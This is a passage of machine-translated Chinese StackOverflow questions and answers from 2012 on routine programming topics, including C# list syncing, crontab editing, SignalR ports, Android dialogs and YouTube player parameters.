# StackOverflow 问答 13418000-13418999

# c# - 根据更新更新列表发生在其他列表中

> ID：13418003
> 
> 赞同：1
> 
> 时间：2012-11-16T13:53:39.717
> 
> 标签：c#, collections

我有`listA`，`listB`。 `listA`是 的子集`listB`。例如，删除 1 个元素并添加 2 个元素`listB`。然后如果`listA`包含从 listB 中删除的元素，则将其从 中删除`listA`。另外，`listA`应该添加新添加的元素。

目前我正在使用`foreach{ if(list.contains) }`两次。一次添加，一次删除。这将是 O(2n)，没关系。

但是有没有一种最好的方法来做到这一点，主要是使用 LINQ 中的 O(n)/任何其他方式？

更清楚地说：
实际上我有一个自定义类的列表。
我`listA`在上述问题中形成的（使用其中一个领域）。`ListB`只是我从网络服务获得的字符串列表。代码：

```
//First foreach loop which I was taking about.

foreach (string A in listA)
{
  if (listB.Contains(A)
   {
   }
  else
   {
      //getting items that are added to listB
   } 
}  

//Second foreach loop which i was taking about.

foreach (string A in listB)
{
  if (listA.Contains(A)
   {
   }
  else
   {
      //getting items that are deleted from listB
   } 
} 
```

然后我会`List<custom class>`相应地更新它。我的主要问题是，除了使用两个`foreach`循环之外，我还能做得更好吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:09:11.630

这可能更有效（尽管这取决于）：

```
var notInA = listB.Except(listA).ToList();
var notInB = listA.Except(listB).ToList();
foreach (var a in notInA)
    listA.Add(a);
foreach (var b in notInB)
    listA.Remove(b); 
```

`IEqualityComparer<T>`请注意，如果`T`是自定义类，则需要实现自定义。

编辑：所以这只是同步两个列表。也许我误解了这个问题，但你不能简单地：

```
listA = new List<T>(listB); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:51:54.973

您应该能够使这些列表可观察。当一个列表更新时，触发 CollectionChanged 事件，并添加一些代码来更新您的另一个列表。你应该能够做到这两种方式。查看可观察的集合：[这里](http://msdn.microsoft.com/en-us/library/ms668604.aspx)

此外，可观察集合允许您检测集合中发生的事件类型。（即添加、删除、替换等）这应该有助于您在使用相同信息更新其他列表的过程中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T14:00:33.627

您可以使用事件/委托代替 foreach 吗？[在此处](https://stackoverflow.com/questions/4253481/how-to-have-lists-with-events-upon-change-in-list)阅读讨论

# crontab - 无法使用 crontab -e 在 Debian 中编辑 cronjobs 文件

> ID：13418007
> 
> 赞同：10
> 
> 时间：2012-11-16T13:53:47.500
> 
> 标签：crontab

我有几个 Debian 服务器，并且总是以这种方式编辑 cronjobs：

crontab -e 和 Ctrl+x

刚买了一个新服务器，不能再这样了。

当我输入 crontab -e 时，文件打开，但我不能写任何东西。我可以上下移动光标，但不能写。我什至无法退出这个文件，因为 Ctr+x 不起作用。

当我打开一个文件时，有一些信息，其余的空行在每行的开头包含波浪号 ~。

任何想法如何编辑此文件？

谢谢。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-03-17T02:50:14.643

您需要打开插入模式。输入后`crontab -e`，按`i`开启插入，输入你的整行，按`esc`完成输入，然后长`shift`按两下`z`保存文件。这就是我在 vi/vim 中设法做到的方式

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-16T14:19:13.913

正如另一个人所建议的那样，vim 显然是您新服务器上的默认编辑器。您可以通过运行来测试它

```
EDITOR=pico crontab -e 
```

替换您实际首选的编辑器（听起来可能是 nano 或 pico）。如果可行，您应该尝试以下方法之一：

1.  编辑您的登录脚本以在登录时设置该环境变量（仅为该用户设置编辑器）
2.  确保您最喜欢的编辑器已安装并运行以下命令（以 root 身份）：`update-alternatives --config sensible-editor`

然后，您可以为所有用户选择默认编辑器（他们可以通过执行选项 1 单独覆盖它）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-16T14:06:48.937

`~`建议您现在使用 vi/vim 而不是通常的编辑器来编辑 crontab

所以 Ctrl-X 不起作用，试试 Esc :wq

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-16T14:03:51.313

你有正确的权限吗？如果没有，也许您应该以root用户身份打开它。

检查它这样做：

ls -all $(哪个 crontab)

如果不是，您可以更改它们..也看看[这里](http://ubuntuforums.org/showthread.php?t=1656806)..也许您会发现更多！

希望能帮助到你。

# javascript - SignalR js 客户端似乎忽略了 url 端口

> ID：13418008
> 
> 赞同：10
> 
> 时间：2012-11-16T13:53:59.373
> 
> 标签：javascript, signalr, signalr-hub

我正在尝试用 SignalR 组合一个简单的“Hello World”风格的应用程序。稍微复杂的因素是 SignalR 集线器需要自托管，而不是在 IIS/ASP.NET 中。据我所知，我已经让服务器端工作了，它在端口 8080 上可用，但我在连接客户端时遇到了麻烦。我目前遇到的问题是 SignalR 客户端似乎忽略了我指定的 URL 上的端口。

具体来说，我在这里有这段代码：

```
<head runat="server">
    <script type="text/javascript" src="/Scripts/jquery-1.8.2.min.js"></script>
    <script type="text/javascript" src="/Scripts/json2.min.js"></script>
    <script type="text/javascript" src="/Scripts/jquery.signalR-0.5.3.js"></script>
    <script type="text/javascript" src="http://<%=Request.Url.Host %>:8080/signalr/hubs"></script>
    <title>SignalR Test</title>
</head>
<body>
    <script type="text/javascript">
        $(function () {

            // Wire up the client to the SignalR server on the same host 
            // as the source of this page, but on port 8080.
            $.connection.url = "http://<%=Request.Url.Host %>:8080/signalr";
            var roomHub = $.connection.roomHub;

            $('#echoButton').click(function () {
                roomHub.echo($('#echoButton').val())
                    .error(function (err) {
                        alert(err);
                    });
            });

            $.connection.hub.start({ transport: 'auto', xdomain: true })
                .done(function () {
                    console.log('Connected.');
                })
                .fail(function (e) {
                    console.log('Unable to connect:' + e);
                });
        });
    </script> 
```

:8080/signalr/hubs 脚本加载成功，看起来不错，也就是说，里面有定义`roomHub`，所以我知道服务器已经启动并正在运行。

但是，在`$.connection.hub.start()`运行时，它似乎*应该尝试为诸如*[http://app.dev.alanta.com:8080/signalr/signalr/negotiate?=1353072553935](http://app.dev.alanta.com:8080/signalr/signalr/negotiate?_=1353072553935)之类的 URL 打开连接。相反，Firebug 告诉我它忽略了 8080 部分，而是尝试与 URL [http://app.dev.alanta.com/signalr/signalr/negotiate?=1353072553935](http://app.dev.alanta.com/signalr/signalr/negotiate?_=1353072553935)协商连接。当然，这不起作用 - 没有 SignalR 服务在端口 80 上侦听，只有常规 Web 服务器 - 所以它失败并显示消息“无法连接：SignalR：协商请求期间出错”。

我还应该注意，在 jquery.signalR-0.5.3.js 文件中，解析连接的代码位似乎确实忽略了端口：

```
// Resolve the full url
parser.href = connection.url;
if (!parser.protocol || parser.protocol === ":") {
    connection.protocol = window.document.location.protocol;
    connection.host = window.document.location.host;
    connection.baseUrl = connection.protocol + "//" + connection.host;
}
else {
    connection.protocol = parser.protocol;
    connection.host = parser.host;
    connection.baseUrl = parser.protocol + "//" + parser.host;
}

// Set the websocket protocol
connection.wsProtocol = connection.protocol === "https:" ? "wss://" : "ws://"; 
```

这是一个错误吗？还是我误解了什么？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-11-16T17:55:58.800

好吧，我可以发誓我已经尝试过了，但没有成功，但是当我对其进行更多故障排除时，我更改了 URL 分配：

```
$.connection.url = "http://<%=Request.Url.Host %>:8080/signalr"; 
```

对此：

```
$.connection.hub.url = "http://<%=Request.Url.Host %>:8080/signalr"; 
```

可以肯定的是，这就是它[在此处](https://github.com/SignalR/SignalR/wiki/SignalR-JS-Client-Hubs)记录的方式。我以为我已经在某处看到它记录了第一种方式，但我现在找不到它。那好吧。将此归结为我没有给予足够的关注。

# android - 在 Android 的子视图中加载 Unity Vuforia 项目会引发致命异常

> ID：13418010
> 
> 赞同：1
> 
> 时间：2012-11-16T13:54:08.530
> 
> 标签：android, 3d, unity3d, augmented-reality, qcar-sdk

我正在`Unity`使用`Vuforia SDK`. 我已经成功地直接从`Unity`to构建了我的项目`Android`。现在我正在尝试在我用 Eclipse 编写的 Android 项目的子视图中运行我的统一项目。我已将我的项目作为库从 Unity 导入到 Eclipse。我已经正确设置了所有库（外部罐子等）。下面是我的`onCreate`方法的代码，其中应将统一项目加载到`FrameLayout`名为 framelayout2 中

```
import android.app.Activity;
import android.os.Bundle;
import android.view.Menu;
import android.view.View;
import android.widget.FrameLayout;
import android.widget.FrameLayout.LayoutParams;

import com.qualcomm.QCARUnityPlayer.QCARPlayerNativeActivity;
import com.qualcomm.QCARUnityPlayer.QCARUnityPlayer;
import com.qualcomm.QCARUnityPlayer.QCARPlayerProxyActivity;

public class MainActivity extends Activity {
public QCARUnityPlayer m_UnityPlayer;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    m_UnityPlayer = new QCARUnityPlayer(this);
    int glesMode = m_UnityPlayer.getSettings().getInt("gles_mode", 1);
    boolean trueColor8888 = false;
    m_UnityPlayer.init(glesMode, trueColor8888);
    setContentView(R.layout.activity_main);

    FrameLayout layout = (FrameLayout) findViewById(R.id.frameLayout2);     

    LayoutParams lp = new LayoutParams (LayoutParams.FILL_PARENT, LayoutParams.FILL_PARENT);

    layout.addView(m_UnityPlayer.getView(), 0, lp);

} 
```

但是该项目在 LogCat 中因以下错误而崩溃：

```
11-16 13:35:06.676: I/QCAR(11889): onSurfaceCreated
11-16 13:35:06.676: W/dalvikvm(11889): No implementation found for native Lcom/qualcomm/QCAR/QCAR;.onSurfaceCreated ()V
11-16 13:35:06.686: W/dalvikvm(11889): threadid=11: thread exiting with uncaught exception (group=0x40c631f8)
11-16 13:35:06.686: D/KeyguardViewMediator(2050): setHidden true
11-16 13:35:06.686: E/AndroidRuntime(11889): FATAL EXCEPTION: GLThread 507
11-16 13:35:06.686: E/AndroidRuntime(11889): java.lang.UnsatisfiedLinkError: onSurfaceCreated
11-16 13:35:06.686: E/AndroidRuntime(11889):    at com.qualcomm.QCAR.QCAR.onSurfaceCreated(Native Method)
11-16 13:35:06.686: E/AndroidRuntime(11889):    at com.qualcomm.QCARUnityPlayer.QCARUnityPlayer.onSurfaceCreated(QCARUnityPlayer.java:39)
11-16 13:35:06.686: E/AndroidRuntime(11889):    at android.opengl.GLSurfaceView$GLThread.guardedRun(GLSurfaceView.java:1446)
11-16 13:35:06.686: E/AndroidRuntime(11889):    at android.opengl.GLSurfaceView$GLThread.run(GLSurfaceView.java:1216)
11-16 13:35:06.686: W/ActivityManager(2050):   Force finishing activity com.samsung.arapp.gr/.MainActivity 
```

有没有人尝试过类似的事情？你能帮我么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-19T01:03:25.107

好像[这个](https://ar.qualcomm.at/content/overlaying-androi-data-over-qcarunityplayer)人也有同样的问题。看看他在[这里采取的步骤](https://ar.qualcomm.at/content/unity-how-can-i-extend-unitys-android-activity)

# windows - Ant 和 Chef 之间的部署/构建工具

> ID：13418012
> 
> 赞同：5
> 
> 时间：2012-11-16T13:54:12.150
> 
> 标签：windows, testing, deployment, build

因此，很长一段时间以来，我一直在为接受像 Chef 或 Puppet 这样的部署/配置管理工具而苦恼。不是因为我总体上对它们有任何犹豫，而是因为我认为它们不适合我们的特定场景。

据我所知，这些类型的工具针对的是频繁/大规模部署，您需要将软件部署到 10 到 1000 个系统。在我们的环境中，我们有大约 25 个不同的 Web 服务集合，分布在六个运行时中，目前每个都有 1-8 个部署在生产中。我们最大的部署问题是每个服务都有不同的部署故事，而且它完全是手动的，所以它往往很耗时且容易出错。另一个问题是生产中的不同实例可能是软件的不同版本，因此我们可能需要同时支持单个服务的多个部署故事。

所以我觉得我们需要更类似于 Ant/Maven/Rake 的东西，它们是为每个服务定制的。但是，我对这些的经验是，它们通常专注于本地操作，并且特定于给定的语言/运行时。

是否有一个运行时无关的框架来以我感兴趣的方式描述和编排构建/测试/部署？

我敢肯定，如果我击中它们的时间足够长，我可以让 Rake 或 Puppet 为我做这些，但我正在寻找为此目的而构建的东西。

（哦，更糟糕的是，一切都在 Windows 上运行）

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T07:13:50.260

这是您可能要考虑的另一种选择：[kwatee](http://www.kwatee.net)（我是附属的）是一个免费的轻量级部署工具，除了具有 Web 管理界面外，还可以与 ant（或 maven 或任何其他与 python CLI 的）集成以自动构建和部署例如开发/测试环境。

其中一件好事是 Web 配置界面，它可以很容易地快速配置您的部署故事，即哪个软件/版本在哪个服务器上运行。通常需要根据目标服务器在配置文件中设置不同的参数。为此，您可以使用为每个服务器配置不同值的 kwatee 变量（类似于环境变量）“模板化”您的包。

软件必须以文件文件夹或存档（zip、tar、tar.gz、bzip2、war）或单个文件（例如 exe）的形式在 Kwatee 的存储库中注册。不支持微星。要在 Windows 上部署 kwatee 需要服务器具有 telnet/ftp 或 ssh/scp（那里有免费工具）。

# android - 屏幕旋转中的对话框窗口行为：为什么 settext 不更新？

> ID：13418015
> 
> 赞同：0
> 
> 时间：2012-11-16T13:54:20.147
> 
> 标签：android, android-dialog, android-fragmentactivity

我有一个简单的项目（API10），在“FragmentActivity”中有一个 Edittext 和一个按钮。主要目标是：当我单击“打开对话框”按钮时，将弹出一个自定义对话框，如果我单击“正”按钮，则对话框关闭并且 Edittext（在 Fragmentactivity 中）将显示“正”...（否定按钮的行为相同）。

一切正常，除非我单击打开 de Dialog 并且在我单击 pos/neg 按钮之前，如果我旋转屏幕，对话框仍然存在，但是，在旋转之后，如果我单击 Pos/Neg 按钮，没有任何反应编辑文本？！

我创建了“applytext”方法，以便可以找到实际的 Edittext，但没有成功。

你能帮我理解发生了什么吗？

（注意：这是我为演示我的问题而制作的一个简单示例，因为我使用的是 dialogFragment，但我有相同的问题行为）。

这是我的代码（MainActivity.java）：

```
public class MainActivity extends FragmentActivity {

    private Button bt;
    private EditText et; 

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        bt = (Button) findViewById(R.id.bt_openDialog);
       // et = (EditText) findViewById(R.id.editText_result);

        bt.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {

                final Dialog d = new Dialog(MainActivity.this, R.style.AppThemeModificado);
                d.requestWindowFeature(Window.FEATURE_NO_TITLE);
                d.setContentView(R.layout.signinlayout);

                Button c = (Button) d.findViewById(R.id.bt_cancelar);

                c.setOnClickListener(new OnClickListener() {

                    @Override
                    public void onClick(View v) {

                    //  et.setText("Negative");

                        applytext("Negative");

                        d.dismiss();

                    }
                });

                Button e = (Button) d.findViewById(R.id.bt_entrar);

                e.setOnClickListener(new OnClickListener() {

                    @Override
                    public void onClick(View v) {

                    //  et.setText("Positive");
                        applytext("Positive");

                        d.dismiss();

                    }
                });

                WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
                lp.copyFrom(d.getWindow().getAttributes());
                lp.width = WindowManager.LayoutParams.FILL_PARENT;
                //lp.height = WindowManager.LayoutParams.FILL_PARENT;
                d.show();
                d.getWindow().setAttributes(lp);

            }
        });

    }

    private void applytext(String text) {

        Log.d("HugoXp", "----in");

        et = (EditText) findViewById(R.id.editText_result);

        if (et == null) {

            Log.d("HugoXp", "et = null");

        }else{

            Log.d("HugoXp", "et <> null");
            Log.d("HugoXp", "Text that was in the et: " + et.getText().toString());
            Log.d("HugoXp", "actual 'String text': " + text);           
        }

        et.setText(text);

        Log.d("HugoXp", "----out");
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
    } 
```

（文件：signinlayout.xml）

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:background="@drawable/outrashape"
    android:orientation="vertical" >

    <ImageView
        android:layout_width="match_parent"
        android:layout_height="64dp"
        android:background="#FFFFBB33"
        android:contentDescription="@string/app_name"
        android:scaleType="center"
        android:src="@drawable/logoheader" />

    <EditText
        android:id="@+id/username"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_marginBottom="4dp"
        android:layout_marginLeft="4dp"
        android:layout_marginRight="4dp"
        android:layout_marginTop="16dp"
        android:hint="@string/username"
        android:inputType="textEmailAddress" />

    <EditText
        android:id="@+id/password"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_marginBottom="16dp"
        android:layout_marginLeft="4dp"
        android:layout_marginRight="4dp"
        android:layout_marginTop="4dp"
        android:hint="@string/password"
        android:inputType="textPassword"
        android:typeface="serif" />

    <TextView
        android:id="@+id/textView1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Applied theme"
        android:textAppearance="?android:attr/textAppearanceLarge" />

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content" >

        <Button
            android:id="@+id/bt_entrar"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_weight="50"
            android:background="@drawable/estilobotaored"
            android:text="Positive" />

        <Button
            android:id="@+id/bt_cancelar"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_weight="50"
            android:background="@drawable/estilobotaored"
            android:text="Negative" />

    </LinearLayout>

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:06:35.333

您可以考虑使用 Android [AlertDialog Fragment](http://developer.android.com/reference/android/app/DialogFragment.html)。它在某些方面不太灵活，但似乎完全可以满足您的需要。虽然，这不是你的问题所在。

无论哪种方式，您都将通过执行此类操作来创建对话框（在单独的文件中或在同一活动中，没关系）

```
public static class MyAlertDialogFragment extends DialogFragment {

public static MyAlertDialogFragment newInstance(int title) {
    MyAlertDialogFragment frag = new MyAlertDialogFragment();
    Bundle args = new Bundle();
    args.putInt("title", title);
    frag.setArguments(args);
    return frag;
}

@Override
public Dialog onCreateDialog(Bundle savedInstanceState) {
    int title = getArguments().getInt("title");

    return new AlertDialog.Builder(getActivity())
            .setIcon(R.drawable.alert_dialog_icon)
            .setTitle(title)
            .setPositiveButton(R.string.alert_dialog_ok,
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int whichButton) {
                        ((FragmentAlertDialog)getActivity()).doPositiveClick();
                    }
                }
            )
            .setNegativeButton(R.string.alert_dialog_cancel,
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int whichButton) {
                        ((FragmentAlertDialog)getActivity()).doNegativeClick();
                    }
                }
            )
            .create();
    }
} 
```

然后，从调用活动中，您可以使用这些回调方法：

```
void showDialog() 
{
        DialogFragment newFragment = MyAlertDialogFragment.newInstance(
        "Title");
        newFragment.show(getFragmentManager(), "dialog");
}

public void doPositiveClick() {

    Log.i("FragmentAlertDialog", "Positive click!");
    editText.setText("positive");
}

public void doNegativeClick() {
    // Do stuff here.
    Log.i("FragmentAlertDialog", "Negative click!");
    editText.setText("negative");
} 
```

因此，在您的按钮 onClick() 中，您只需调用 showDialog()，其余部分应按预期工作

# javascript - 如何获取“导航网格”参数

> ID：13418024
> 
> 赞同：0
> 
> 时间：2012-11-16T13:55:09.363
> 
> 标签：javascript, jqgrid

如何获取“navGrid”选项参数？

例如：如果我这样定义'navGrid'......：

```
$('#myGrid').jqGrid('navGrid', '#myNavGrid', {
    edit : true,
    edittitle : "edit",
    editfunc : _editRow, // a custom function
}); 
```

...如何在我的代码的其他部分获取“editfunc”函数（或“edittitle”值）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T15:15:59.187

无法获取用于`navGrid`您用作其他函数参数的大多数其他选项的类似参数的参数。我真的不明白你*为什么*需要它。您可以将参数保存在外部块某处定义的变量中，并在需要时使用它：

```
var navGridOptions = {
        edit : true,
        edittitle : "edit",
        editfunc : _editRow, // a custom function
    };
....
$('#myGrid').jqGrid('navGrid', '#myNavGrid', navGridOptions);

// you can use here navGridOptions one more time 
```

# javascript - Youtube Javascript API - 禁用相关视频

> ID：13418028
> 
> 赞同：71
> 
> 时间：2012-11-16T13:55:15.697
> 
> 标签：javascript, youtube-api

是的，这似乎记录得很差，或者我在文档中看不到它。我基本上不希望`?rel=0`使用 JavaScript API 的相关视频 ()。

```
$players[$vidIdPlaceholderRef] = new YT.Player('player_' + $vidIdPlaceholderRef, {
    height: '550',
    width: '840',
    videoId: $vidId
}); 
```

是我所拥有的。

我也试过：

```
$players[$vidIdPlaceholderRef] = new YT.Player('player_' + $vidIdPlaceholderRef, {
    height: '550',
    width: '840',
    videoId: $vidId + '?rel=0',
    rel : 0
}); 
```

没有运气。有谁知道可以添加的选项（尝试`rel : 0`但没有运气）

* * *

## 回答 #1

> 赞同：161
> 
> 时间：2012-11-16T14:12:22.730

“rel”是一个播放器参数，如下所示：

[https://developers.google.com/youtube/player_parameters#rel](https://developers.google.com/youtube/player_parameters#rel)

要将播放器参数添加到 iframe 播放器，您需要指定第二个构造函数参数的 playerVars 属性（在撰写本文时，[此处](https://developers.google.com/youtube/player_parameters#Embedding_a_Player)已记录，并且在[IFrame API 文档页面上](https://developers.google.com/youtube/iframe_api_reference)）

例如

```
new YT.Player('playerid', {
    height: '550',
    width: '840',
    videoID: 'video_id',
    playerVars: {rel: 0, showinfo: 0, ecver: 2}
}); 
```

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2018-10-19T06:46:39.567

rel player 参数的行为已更改。

[从文档](https://developers.google.com/youtube/player_parameters#Revision_History)中，

> rel 参数的行为在 2018 年 9 月 25 日或之后发生更改。更改的影响是您将无法禁用相关视频。但是，您可以选择指定播放器中显示的相关视频应来自与刚刚播放的视频相同的频道

因此，不再可能禁用相关视频。而是`playerVars: {rel:0}`会改变玩家的行为并显示来自指定频道的建议。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2019-10-30T15:03:23.557

您可以在两个位置获得相关视频：在带有网格的视频末尾，以及在视频底部暂停时。我已经找到了一种在最后删除它们的方法，并使底部的那些至少对大多数企业来说是可以忍受的。

## 1.删​​除视频末尾的相关视频

**[IFrame 播放器 API：事件](https://developers.google.com/youtube/iframe_api_reference#Events)**

为避免在视频末尾显示相关视频，我只是停止了视频，使其返回显示缩略图和播放按钮：

```
var player = new YT.Player('player', {
   height: '390',
   width: '640',
   events: {
      'onStateChange': function(event){
         switch(event.data){
            // Stop the video on ending so recommended videos don't pop up
            case 0:     // ended
               player.stopVideo();
               break;
            case -1:    // unstarted
            case 1:     // playing
            case 2:     // paused
            case 3:     // buffering
            case 5:     // video cued
            default:
               break;
         }
      }
   }
}); 
```

您也可以替换`player.stopVideo();`为您想要运行的任何其他代码。

## 2.在视频底部制作相关视频只显示您的视频

**[IFrame Player API：YouTube 嵌入式播放器和播放器参数](https://developers.google.com/youtube/player_parameters.html)**

`rel=0`不再避免显示任何相关视频；现在，它仍会显示相关视频，但至少它们只会来自您的频道。这在 2018 年 9 月 25 日左右的某个时间发生了变化（[文档](https://developers.google.com/youtube/player_parameters#rel)）。

通过`playerVars`在 YT.Player 中设置，我们至少可以让相关视频只显示我们频道的视频。文档不清楚您必须`playerVars`设置为对象，但您可以像这样设置它：

```
var player = new YT.Player('player', {
   ...
   playerVars:{
      rel:              0
      modestbranding:   1,       // If you're trying to remove branding I figure this is helpful to mention as well; removes the YouTube logo from the bottom controls of the player
      // color:         'white', // Can't have this and modestbranding active simultaneously (just a note in case you run into this)
   },
   ...
}); 
```

## 2A。从底部删除相关视频的潜在方法

如果我有时间，我可能会更多地研究它，但这里可能有答案：

我们可以轻松地访问 iframe 对象，但我们不能对它做任何事情：[IFrame Player API：访问和修改 DOM 节点](https://developers.google.com/youtube/iframe_api_reference#Adding_event_listener)。似乎因为我们要从 YouTube 编辑 iframe，所以存在安全问题（不管我们实际在做什么）。理想情况下，我可以使用 删除“更多视频”文本`player.getIframe().contentWindow.document.querySelector('.ytp-pause-overlay.ytp-scroll-min').remove()`，但是当我运行时`player.getIframe().contentWindow.document`出现错误`SecurityError: Permission denied to access property "document" on cross-origin object`。

但`playerVars`也有一个`origin`值可以让我们访问 iframe 的对象：

```
var player = new YT.Player('player', {
   ...
   playerVars:{
      origin:           'https://mywebsite.com'
   },
   ...
}); 
```

它不适用于 localhost，但这[可能是 Chromium 和 Firefox 的事情](https://stackoverflow.com/questions/10883211/deadly-cors-when-http-localhost-is-the-origin?source=post_page---------------------------)。也许这在现场网站上是一个合法的选择；当/如果我尝试让你知道我是否成功时，我会更新这篇文章。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2018-01-05T21:39:37.390

接受的解决方案对我不起作用。起作用的是：

1) 将 iframe 放入包含 rel 参数的 html 中

```
<iframe id="youtube-video" width="560" height="315" 
 src="https://www.youtube.com/embed/M7lc1UVf-VE?enablejsapi=1&rel=0&modestbranding=1" 
 frameborder="0" enablejsapi="1" allowfullscreen></iframe> 
```

2) 使用 javascript API 附加到该现有播放器

```
var tag = document.createElement('script');
tag.src = "https://www.youtube.com/iframe_api";
var firstScriptTag = document.getElementsByTagName('script')[0];
firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

var player;
function onYouTubeIframeAPIReady() {
  player = new YT.Player('youtube-video', {
    events: {
      'onReady': onPlayerReady,
      'onStateChange': onPlayerStateChange
    }
  });
}

function onPlayerReady(event) {
    console.log("ready");
}

function onPlayerStateChange(event) {
    console.log("state changed");
} 
```

演示小提琴：http: [//jsfiddle.net/bf7zQ/195/](http://jsfiddle.net/bf7zQ/195/)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-05-09T02:18:17.687

如果您使用的是 SWFObject，则只需执行以下操作：

```
function loadVideo() {
        var params = { allowScriptAccess: "always" }
            , atts = { id: "myvideo" }
        ;
//NOTE THE END OF THE BELOW LINE vvvvvv
        swfobject.embedSWF("https://www.youtube.com/v/[video id here]?enablejsapi=1&playerapiid=myvideo&version=3&rel=0"
         , "videoplaceholderid"
         , "768", "432", "8", null, null, params, atts);
    } 
```

只需添加`rel=0`到您的网址的末尾。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-11-10T14:34:33.997

无需通过 API 编写代码，现在可以轻松完成

你管嵌入按钮 - >显示更多 - >勾选选项“视频结束时显示建议的视频”

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-08-23T03:11:15.547

这是一个快速解决方案：

```
setInterval(function(){
    if($('iframe').length > 0){
        $('iframe').each(function(){
            if($(this).hasClass('gotYou')){
                //do nothing
            }else{
                var getMySrc = $(this).attr('src');
                var newSrc = getMySrc.split('?');
                console.log(newSrc);
                var freshURL = newSrc[0]+'?rel=0&'+newSrc[1];
                console.log(freshURL);
                $(this).addClass('gotYou');
                $(this).attr('src', freshURL );         
            }
        });
    }
}, 1); 
```

它的作用是在您的文档中查找 iframe。如果找到 iframe，它会抓取 iframe 的 src，找到`?`标记然后替换`?`为`?rel=0&`。这里的目标是出去`rel=0`

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2018-08-23T05:20:50.250

```
new YT.Player('playerid', {
    height: '550',
    width: '840',
    videoID: 'video_id',
    playerVars: {rel: 0},
});
```

# google-plus - 有没有办法在我的网站上显示 google+ Zagat 分数？

> ID：13418030
> 
> 赞同：1
> 
> 时间：2012-11-16T13:55:26.633
> 
> 标签：google-plus

我正在尝试显示谷歌在我的网站上显示的 Zagat 评论分数。有没有办法获取该数据，可能是一个返回 JSON 分数的服务......在此先感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-19T16:32:09.767

我已经尝试过 - Google Places API 提供 0.0 到 5.0 的用户评分，但没有 Zagat 评分。（真糟糕！）然而，它确实提供了一个标志（在规范的末尾），表明它是否是 Zagat 推荐的机构。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:16:49.373

这不是 Google Plus API 的一部分，但您可以在 Google Places API 中找到您需要的内容：[https ://developers.google.com/places/documentation/details](https://developers.google.com/places/documentation/details)

# javascript - 每天用另一张图片替换一张图片（.jpg）的脚本？

> ID：13418034
> 
> 赞同：1
> 
> 时间：2012-11-16T13:55:48.667
> 
> 标签：javascript, .net, visual-studio, visual-studio-2005

我有一个已经运行了一段时间的 Visual Studio 2005 站点。我在这个网站上有一张图片 (.JPG)，我认为我需要对其应用一些 JavaScript 或其他东西？

基本上我在 12 月份有 25 张图片，而不是每天进入网站将这张图片更改为另一张图片，我希望能够通过代码自动完成此操作。

我有一些 .NET 技能，但我认为我可能需要使用 JavaScript 来完成这项任务。谁能指出我正确的方向或为我提供一些可以帮助的示例代码？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:43:40.870

我认为最简单的方法是将所有图像重命名为“December1.jpg”、“December2.jpg”、“December3.jpg”等。然后在服务器端你会有这个：

```
<img src="/path/to/images/December<%=DateTime.Now.Day%>.jpg"/> 
```

这只会将月份中的日期添加到您的图像名称中。有很多更好的方法可以做到这一点，但对于一次性交易，没有比这更简单的了。

编辑：您还可以为您的图像添加“如果存在”，这样在 26 日您就不会得到 404 图像。像这样的东西：

更改您的图像以添加一个 id 并将其默认为隐藏：

```
<img id="dayImage" runat="server" Visibility="false" src="/path/to/images/December<%=DateTime.Now.Day%>.jpg"/> 
```

然后在后面的代码上：

```
if (File.Exists(@"C:\path\to\images\December" + DateTime.Now.Day + ".jpg"))
{
    //this will show the image if it exists on the disk
    dayImage.Visibility = true;
} 
```

有关更多信息，请访问：http: [//www.dotnetperls.com/file-exists](http://www.dotnetperls.com/file-exists)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T15:12:19.480

我这样做的方式是使用服务器端代码，但我认为每个人展示一个 JavaScript 示例会更简单。虽然可以采取多种方法来完成您的要求，但一种简单的方法是将所有图像文件的 url 作为字符串存储在数组中，如下所示：

```
var urlPath = new Array();

urlPath[0] = "Leave Empty"; //Because there will never be a 0th day of any month...
urlPath[1] = "/Images/nameOfPic1.jpg";
urlPath[2] = "/Images/nameOfPic2.jpg";
